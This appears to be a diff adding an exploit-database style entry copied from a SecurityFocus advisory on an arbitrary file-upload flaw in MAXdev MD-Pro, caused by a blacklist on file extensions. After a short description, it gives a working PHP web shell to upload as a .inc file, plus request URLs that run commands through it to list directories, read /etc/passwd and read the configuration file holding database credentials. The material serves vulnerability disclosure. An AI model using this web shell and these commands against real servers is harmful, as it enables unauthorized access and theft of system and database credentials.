@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/14750/info
+
+MAXdev MD-Pro is prone to an arbitrary remote file upload vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.
+
+This issue is due to a design error in the application that uses a blacklist technique, saying what file extensions can not be uploaded, versus a whitelist design that would only permit certain file extensions. An attacker can exploit this vulnerability to upload arbitrary files including malicious scripts and possibly execute the script on the affected server.
+
+This can ultimately facilitate unauthorized access in the context of the Web server. 
+
+upload a file with .inc extension with this code inside:
+
+<?php
+error_reporting(0);
+system($_GET[c]);
+?>
+
+now list directories with:
+http://www.example.com/upload/dl/[filename].inc?c=ls%20-la
+
+see /etc/passwd file:
+http://www.example.com/upload/dl/[filename].inc?c=cat%20/etc/passwd
+
+see database username and password:
+http://www.example.com/upload/dl/[filename].inc?c=cat%20.././config/md-config.php 
